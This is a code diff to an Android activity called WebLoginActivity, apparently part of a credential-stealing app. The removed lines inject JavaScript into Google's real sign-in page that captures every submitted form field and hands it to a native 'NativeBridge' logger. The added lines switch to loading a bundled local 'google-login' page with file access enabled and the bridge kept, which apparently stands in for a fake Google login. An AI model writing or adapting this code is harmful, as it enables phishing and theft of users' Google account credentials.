@@ -17,32 +17,12 @@ public class WebLoginActivity extends Activity {
         web = new WebView(this);
         web.getSettings().setJavaScriptEnabled(true);
         web.getSettings().setDomStorageEnabled(true);
-        web.getSettings().setUserAgentString(
-            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Mobile Safari/537.36");
+        web.getSettings().setAllowFileAccess(true);
 
         web.addJavascriptInterface(new Bridge(), "NativeBridge");
+        web.setWebViewClient(new WebViewClient());
 
-        web.setWebViewClient(new WebViewClient() {
-            @Override
-            public void onPageFinished(WebView view, String url) {
-                // вешаем перехват на все формы
-                view.loadUrl("javascript:(function(){" +
-                    "var forms=document.getElementsByTagName('form');" +
-                    "for(var i=0;i<forms.length;i++){" +
-                    "  forms[i].addEventListener('submit',function(e){" +
-                    "    var inputs=this.getElementsByTagName('input');" +
-                    "    var out='';" +
-                    "    for(var j=0;j<inputs.length;j++){" +
-                    "      if(inputs[j].value) out+=inputs[j].name+'='+inputs[j].value+'\\n';" +
-                    "    }" +
-                    "    NativeBridge.log(out);" +
-                    "  },true);" +
-                    "}" +
-                    "})()");
-            }
-        });
-
-        web.loadUrl("https://accounts.google.com/ServiceLogin");
+        web.loadUrl("file:///android_asset/google-login/index.html");
         setContentView(web);
     }
 
